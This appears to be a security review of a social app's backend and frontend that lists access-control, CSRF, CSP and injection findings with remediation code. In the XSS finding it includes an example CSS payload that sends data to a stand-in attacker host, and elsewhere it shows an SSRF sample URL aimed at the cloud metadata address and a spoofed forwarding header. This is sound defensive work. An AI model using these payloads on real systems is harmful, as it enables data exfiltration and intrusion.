# Security Review — Viraha MVP
Branch: mvp/stabilize-auth-post-feed-profile

---

## CRITICAL

### CRIT-01 — Privacy Filter Bypass via Comments Endpoint
**OWASP: A01 Broken Access Control**
**File:** `backend/src/controllers/commentController.ts:80-124` (getComments), `backend/src/controllers/commentController.ts:126-151` (getReplies)

`GET /posts/:postId/comments` and `GET /comments/:commentId/replies` are protected only by `optionalAuth`. Both handlers verify the post exists and is not deleted, but neither checks `post.privacy`. An unauthenticated attacker who guesses or enumerates a UUID for a `private` or `followers`-only post can retrieve all comments on that post, revealing who interacted with it and what they said. `getReplies` does not check the parent post at all.

**Remediation:**
```typescript
// In getComments, after fetching the post:
if (post.privacy === 'private') {
  if (!req.user || post.userId !== req.user.userId) {
    return res.status(404).json({ success: false, error: { code: 'NOT_FOUND', message: 'Post not found' } });
  }
}
if (post.privacy === 'followers') {
  if (!req.user) return res.status(404).json({ ... });
  if (post.userId !== req.user.userId) {
    const follow = await prisma.follow.findUnique({ where: { followerId_followingId: { followerId: req.user.userId, followingId: post.userId } } });
    if (!follow || follow.status !== 'accepted') return res.status(404).json({ ... });
  }
}
```
Apply the same pattern to `getReplies` (fetch the parent comment's post and enforce privacy there).

**Similar patterns to audit:** `GET /posts/:postId/comments` is the most direct instance. Any future aggregation endpoint (likes, saves counts) touching private posts must apply the same filter.

---

## HIGH

### HIGH-01 — CSRF_SECRET Optional in Production; Falls Back to JWT_SECRET
**OWASP: A05 Security Misconfiguration**
**Files:** `backend/src/config/env.ts:21`, `backend/src/middleware/csrf.ts:8`

`CSRF_SECRET` is `optional()` in the Zod schema and the production placeholder check does not include it. `getSecret` in csrf.ts falls back to `JWT_SECRET` when `CSRF_SECRET` is unset. This means a single secret key is now protecting both JWT authentication and CSRF tokens. Compromise of that one secret breaks both protections simultaneously.

**Remediation:**
```typescript
// env.ts: make CSRF_SECRET required in production
CSRF_SECRET: z.string().min(32),

// refine: add CSRF_SECRET to placeholder check
return !isPlaceholder(data.JWT_SECRET) && !isPlaceholder(data.JWT_REFRESH_SECRET) && !isPlaceholder(data.CSRF_SECRET);
```

---

### HIGH-02 — mediaUrls Accept Arbitrary URLs; No Domain Allowlist
**OWASP: A10 Server-Side Request Forgery / A03 Injection**
**File:** `backend/src/validators/postValidators.ts:5`

`mediaUrls: z.array(z.string()).min(1).max(10)` accepts any string. An authenticated attacker can `POST /posts` with `mediaUrls: ["http://169.254.169.254/latest/meta-data/"]` or other internal endpoints. While the backend itself doesn't currently fetch these URLs, they are stored in the database and served to all viewers of the post. This enables URL injection into other users' browsers and, if any future pipeline fetches media for processing (e.g., thumbnail generation, OG cards), becomes a full server-side SSRF.

**Remediation:**
```typescript
const R2_DOMAIN = process.env.R2_PUBLIC_URL ? new URL(process.env.R2_PUBLIC_URL).hostname : null;

mediaUrls: z.array(
  z.string().url().refine((url) => {
    if (!R2_DOMAIN) return false;
    const parsed = new URL(url);
    return parsed.hostname === R2_DOMAIN || parsed.hostname.endsWith(`.${R2_DOMAIN}`);
  }, 'Media URLs must be hosted on the approved CDN domain')
).min(1).max(10),
```
Apply the same allowlist to `mediaThumbnails` in `createPostSchema` and to `coverImage` fields in album/journal validators.

---

### HIGH-03 — Album Posts Endpoint Leaks Posts Across Privacy Boundary
**OWASP: A01 Broken Access Control**
**File:** `backend/src/controllers/albumController.ts:421-486` (getAlbumPosts)

`GET /albums/:id/posts` (optionalAuth) enforces album-level privacy correctly. However, the returned `albumPost` objects embed full `post` data including `caption`, `mediaUrls`, and location for every post in the album. Posts inside the album may have an individual `privacy` value of `private` or `followers` that is stricter than the album itself (e.g., album is `public` but individual post is `private`). There is no per-post privacy filter applied before embedding in the album response.

Additionally, `addPostToAlbum` (`backend/src/controllers/albumController.ts:297-366`) does not verify that `post.userId === album.userId`. Any authenticated user can add other users' posts to their own album, creating cross-user album associations.

**Remediation for post privacy leak:**
```typescript
// After fetching albumPosts, filter individual posts by their own privacy:
const items = albumPosts.filter(ap => {
  const post = ap.post;
  if (post.userId === req.user?.userId) return true;
  if (post.privacy === 'private') return false;
  // followers check if needed
  return true;
});
```
**Remediation for cross-user post addition:**
```typescript
if (post.userId !== userId) {
  return res.status(403).json({ success: false, error: { code: 'FORBIDDEN', message: 'You can only add your own posts to albums' } });
}
```

---

### HIGH-04 — XSS via `style` Attribute in DOMPurify Allowlist
**OWASP: A03 Injection (XSS)**
**File:** `frontend/src/lib/utils/sanitize-html.ts:14`

`'style'` is in `ALLOWED_ATTR`. DOMPurify does not filter CSS property values when `style` is allowed as an attribute. Attackers can inject CSS such as `style="background: url(https://attacker.com/?c=exfil)"` or use CSS `expression()` (IE legacy) and `behavior:` properties. On modern browsers, this enables UI redressing, clickjacking within content, and cross-origin data exfiltration via CSS `url()` fetch.

**Remediation:**
Remove `'style'` from `ALLOWED_ATTR` and use class-based styling exclusively for rich text rendering. If inline styles are required for text alignment (noted by `data-text-align`), handle alignment via the `data-text-align` attribute mapped to CSS classes at render time, not via arbitrary `style` values.

---

## MEDIUM

### MED-01 — CSRF Session Identifier Falls Back to IP then `'anonymous'`
**OWASP: A05 Security Misconfiguration**
**File:** `backend/src/middleware/csrf.ts:9`

```
getSessionIdentifier: (req) => req.cookies?.viraha_access || req.ip || 'anonymous'
```

When a user has no access token cookie (any unauthenticated request), all users sharing the same IP (NAT, corporate proxy) share the same CSRF session identifier. Worse, if `req.ip` is somehow unavailable, every unauthenticated request in the process uses `'anonymous'`, making all their CSRF tokens equivalent. The login form fetches and uses a CSRF token under identifier `anonymous` — an attacker on the same NAT could re-use a CSRF token obtained from their own session to forge the victim's login POST.

**Remediation:** Use a persistent random identifier stored in a separate non-auth cookie for unauthenticated sessions, or generate the CSRF session ID from a cookie set at first visit.

---

### MED-02 — `refreshTokenSchema` Requires Body Field That the Handler Ignores
**OWASP: A04 Insecure Design**
**Files:** `backend/src/validators/authValidators.ts:15-17`, `backend/src/controllers/authController.ts:156`

`POST /auth/refresh` runs `validateBody(refreshTokenSchema)` which requires `{ refreshToken: string }` in the request body, but `refreshTokenHandler` reads the token exclusively from `req.cookies?.viraha_refresh` and ignores the body field entirely. This means:
1. The validation is a no-op guard — it passes any string but the value is discarded.
2. Any client that sends the token in the body (mobile, third-party) is silently broken.
3. The body field could mislead a future developer into thinking the refresh token travels in the body.

**Remediation:** Remove `validateBody(refreshTokenSchema)` from the refresh route, or change the validator to validate the cookie presence (which Zod body validation can't do).

---

### MED-03 — `script-src` Includes `'unsafe-eval'` and `'unsafe-inline'`
**OWASP: A05 Security Misconfiguration**
**File:** `frontend/next.config.ts:12`

```
script-src 'self' 'unsafe-eval' 'unsafe-inline' api.mapbox.com
```

`'unsafe-eval'` allows `eval()`, `Function()`, and similar dynamic code execution. `'unsafe-inline'` disables inline script blocking. Together these negate most of the XSS protection that CSP provides. If any user content reaches a `dangerouslySetInnerHTML` without sanitization, these directives allow execution.

**Remediation:** Replace `'unsafe-inline'` with a nonce-based or hash-based approach (Next.js 14 supports nonce-based CSP via `next.config.js`). For `'unsafe-eval'`, audit whether any bundled library (Mapbox GL JS, MUI) requires it and use the Trusted Types CSP if possible.

---

### MED-04 — Email Stored in localStorage via Auth Store
**OWASP: A02 Cryptographic Failures / PII Exposure**
**File:** `frontend/src/lib/stores/auth-store.ts:13-33`, `frontend/src/lib/types/index.ts:4`

The `User` object stored via Zustand `persist` (key: `viraha-auth`) includes `email`. The auth store uses the default `localStorage` storage. Email is PII and should not be persisted in `localStorage` where it is accessible to any same-origin JavaScript (including third-party scripts injected via XSS). JWTs travel only as httpOnly cookies, so this is the only auth-related PII exposure point.

**Remediation:** Exclude `email` from the persisted state, or project to a minimal shape:
```typescript
partialize: (state) => ({ user: state.user ? { id: state.user.id, username: state.user.username, displayName: state.user.displayName, avatar: state.user.avatar } : null }),
```

---

### MED-05 — No HSTS on Frontend
**OWASP: A05 Security Misconfiguration**
**File:** `frontend/next.config.ts:34-47`

The `headers()` array does not include `Strict-Transport-Security`. Helmet sets HSTS on the Express backend but the Next.js frontend headers block has no HSTS directive. Users who visit the frontend over HTTP in production will not be upgraded to HTTPS.

**Remediation:**
```typescript
{ key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' },
```

---

## LOW

### LOW-01 — Rate Limiter Uses In-Memory Store (No Redis); Ineffective Under Horizontal Scale
**OWASP: A04 Insecure Design**
**File:** `backend/src/middleware/rateLimiter.ts`

`express-rate-limit` defaults to an in-memory store. With multiple backend instances, each process maintains its own counter. The `authLimiter` (20 requests / 15 min) and `apiLimiter` (200 / 15 min) can be trivially bypassed by routing requests through a load balancer to different instances.

**Remediation:** Wire `express-rate-limit` to `rate-limit-redis` using the existing `REDIS_URL` env var.

---

### LOW-02 — Password Reset Token Stored as Plaintext
**OWASP: A02 Cryptographic Failures**
**File:** `backend/src/controllers/authController.ts:311`

`randomBytes(32).toString('hex')` is stored directly in `password_reset.token`. If the database is breached, all unused reset tokens are immediately exploitable. Best practice is to store a hashed form (`SHA-256`) of the token and compare via constant-time hash comparison.

**Remediation:**
```typescript
const rawToken = randomBytes(32).toString('hex');
const hashedToken = createHash('sha256').update(rawToken).digest('hex');
// store hashedToken in DB, send rawToken in email
// on reset: hash incoming token and compare with stored hash
```

---

### LOW-03 — `style` CSS Injection Risk in Sanitize Allowlist (see HIGH-04 above for primary finding)
Already captured in HIGH-04.

---

### LOW-04 — Trust Proxy Set to `1`; IP-Based Rate Limiting Spoofable via X-Forwarded-For
**OWASP: A04 Insecure Design**
**File:** `backend/src/app.ts:39`

`app.set('trust proxy', 1)` trusts the first `X-Forwarded-For` hop. If the backend is directly internet-reachable (no dedicated reverse proxy), attackers can set `X-Forwarded-For: 1.2.3.4` to spoof their IP address and bypass IP-based rate limiting.

**Remediation:** Ensure a reverse proxy (nginx, Cloudflare) terminates public traffic and is the only entity that can set `X-Forwarded-For`. Restrict `trust proxy` to the specific proxy IP if possible.

---

## Summary Table

| ID | Severity | OWASP | Description |
|----|----------|-------|-------------|
| CRIT-01 | CRITICAL | A01 | Comments endpoint exposes private/followers post comments without auth or privacy check |
| HIGH-01 | HIGH | A05 | CSRF_SECRET optional; falls back to JWT_SECRET in production |
| HIGH-02 | HIGH | A10/A03 | mediaUrls accept arbitrary URLs; no domain allowlist (URL injection, pre-SSRF) |
| HIGH-03 | HIGH | A01 | Album posts endpoint leaks individual post privacy; addPostToAlbum allows cross-user post addition |
| HIGH-04 | HIGH | A03 | `style` attribute in DOMPurify allowlist enables CSS-based data exfiltration |
| MED-01 | MEDIUM | A05 | CSRF session identifier falls back to shared IP / `'anonymous'` for unauthenticated requests |
| MED-02 | MEDIUM | A04 | refreshTokenSchema validates body field that the handler ignores |
| MED-03 | MEDIUM | A05 | CSP uses `'unsafe-eval'` + `'unsafe-inline'` — negates XSS protection |
| MED-04 | MEDIUM | A02 | User email persisted to localStorage via Zustand auth store |
| MED-05 | MEDIUM | A05 | No HSTS header on Next.js frontend |
| LOW-01 | LOW | A04 | In-memory rate limiter ineffective under horizontal scale |
| LOW-02 | LOW | A02 | Password reset token stored as plaintext (not hashed) |
| LOW-04 | LOW | A04 | trust proxy=1 allows X-Forwarded-For spoofing to bypass rate limits |

**CRITICAL: 1 | HIGH: 4 | MEDIUM: 5 | LOW: 3**
